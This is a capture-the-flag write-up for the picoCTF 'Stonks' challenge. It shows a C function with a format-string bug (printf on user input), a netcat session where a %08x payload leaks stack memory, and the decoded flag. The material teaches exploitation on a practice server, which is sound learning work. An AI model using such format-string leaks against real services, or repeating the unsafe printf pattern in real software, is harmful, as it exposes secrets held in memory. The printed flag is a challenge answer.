# Stonks
## Description
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](vuln.c) `nc mercury.picoctf.net 53437`
## Hints
1. Okay, maybe I'd believe you if you find my API key.
## Solution
1. There is a `printf` vulnerability in the `buy_stonks` function when it prints `user_buf`.
```c
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```
2. Buy some stonks and enter a lengthy format string as your API token.
```console
% nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
Buying stonks with token:
08b04370.0804b000.080489c3.f7f77d80.ffffffff.00000001.08b02160.f7f85110.f7f77dc7.00000000.08b03180.00000001.08b04350.08b04370.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.34636462.61653532.ffa0007d.f7fb2af8.f7f85440.86782200.00000001.00000000.f7e14ce9.f7f860c0.f7f775c0.f7f77000.ffa00bc8.f7e0568d.f7f775c0.08048eca.ffa00bd4.00000000.f7f99f09
Portfolio as of Mon Jul  4 01:38:10 UTC 2022


1 shares of XBE
2 shares of T
4 shares of BE
430 shares of VP
Goodbye!
```
3. It looks like ASCII here: `6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.34636462.61653532.ffa0007d`. Input it in [CyberChef](https://gchq.github.io/CyberChef/), swap the endianness, and convert from hex: `picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}.éÿ`
